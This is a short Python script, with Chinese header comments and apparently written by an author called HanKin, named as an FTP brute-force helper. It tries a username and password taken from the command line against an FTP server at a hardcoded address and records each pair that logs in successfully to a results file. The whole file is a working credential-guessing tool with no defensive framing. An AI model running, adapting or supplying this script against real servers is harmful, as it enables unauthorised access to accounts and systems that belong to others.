# -*- coding: utf-8 -*-
"""
文 件 名: brute_ftp_by_arg.py
文件描述: 使用参数尝试登陆ftp
作    者: HanKin
创建日期: 2021.08.12
修改日期：2021.08.12

Copyright (c) 2021 HanKin. All rights reserved.
"""

import ftplib 
import socket 
import sys 

try: 
    user = sys.argv[1] 
    passwd = sys.argv[2]
    ftp = ftplib.FTP('1.2.3.4') 
    ftp.login(user,passwd) 
    hand = open('ret.txt','a+') 
    hand.write(user + ':' + passwd + '\n') 

except ftplib.error_perm: 
    print('passwd[{}] is wrong!'.format(passwd))

except EOFError:
    print('EOFError')
